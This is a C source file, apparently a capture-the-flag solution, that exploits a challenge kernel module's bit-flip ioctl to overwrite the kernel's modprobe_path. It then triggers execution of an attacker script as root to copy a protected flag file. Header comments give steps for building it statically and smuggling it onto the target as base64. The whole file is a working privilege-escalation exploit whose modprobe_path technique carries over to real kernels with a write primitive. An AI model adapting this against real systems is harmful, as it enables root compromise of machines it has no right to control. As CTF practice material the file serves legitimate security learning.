// LOCAL:	musl-gcc -static -s exploit.c -o exploit
//			cat exploit | gzip | base64 > b64.txt
// REMOTE:	cat > exploit.gz.b64
//			base64 -d exploit.gz.b64 > exploit.gz
//			gunzip exploit.gz
//			chmod +x exploit

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <fcntl.h>


// Data dtructure definition (it needs exactly 16 bytes)
typedef struct payload {
    uint64_t target_addr;
    uint64_t bit_index;
} module_data_t;


int generate_flip_instructions(const char *original, const char *desired, 
								uint64_t base_addr, size_t len, 
								module_data_t *bit_flips) {
	int flip_count = 0;

	for (size_t byte_offset = 0; byte_offset < len; ++ byte_offset) {
		uint8_t xor_mask = original[byte_offset] ^ desired[byte_offset];

		if (xor_mask != 0) {
			// Calculate the exact memory address of the byte to flip.
			uint64_t current_byte_addr = base_addr + byte_offset;

			for (int bit_pos = 0; bit_pos < 8; ++ bit_pos) {

				// If the bit is set in the mask, it needs to be flipped
				if ((xor_mask >> bit_pos) & 1) {
					bit_flips[flip_count].target_addr = current_byte_addr;
					bit_flips[flip_count].bit_index = bit_pos;
					flip_count++;
				}
			}
		}
	}

	return flip_count;
}


int main() {
	int fd;
	module_data_t bit_flips[64];
	char fake_modprobe_path[16] = "/home/ctf/fake\x00";
	char real_modprobe_path[16] = "/sbin/modprobe\x00";
	unsigned long modprobe_path_addr = 0xffffffff82dd4940;
	
    int total_flips = generate_flip_instructions(real_modprobe_path, fake_modprobe_path, 
												modprobe_path_addr, sizeof(fake_modprobe_path),
												bit_flips);

	if ((fd = open("/dev/flipper_hero", O_RDONLY)) < 0) {
		perror("Failed to open module");
		exit(-1);
	}

	for (int i = 0; i < total_flips; ++ i) {
		if (ioctl(fd, 0x13370001, &bit_flips[i]) < 0) {
			perror("ioctl call failed");
			close(fd);
			return EXIT_FAILURE;
		}

		printf("Flip %d/%d:  target=0x%llx, bit=%ld - SUCCESS\n", 
				i + 1, total_flips, (unsigned long long)bit_flips[i].target_addr, bit_flips[i].bit_index);
    }

	close(fd);

	// Create a script to copy flag to the home directory and give read access to it.
	// Then create the trigger file and run it to trigger the fake modprobe (a.k.a. our script)
	system("echo '#!/bin/sh\ncp /root/flag.txt /home/ctf/flag.txt\nchmod +r /home/ctf/flag.txt' > /home/ctf/fake");
	system("chmod +x /home/ctf/fake");
	system("echo -e '\xff\xff\xff\xff' > /home/ctf/trigger");
	system("chmod +x /home/ctf/trigger");
	system("/home/ctf/trigger");		// Trigger modprobe

	// Now we can read the flag
	system("cat /home/ctf/flag.txt");
	return EXIT_SUCCESS;
}
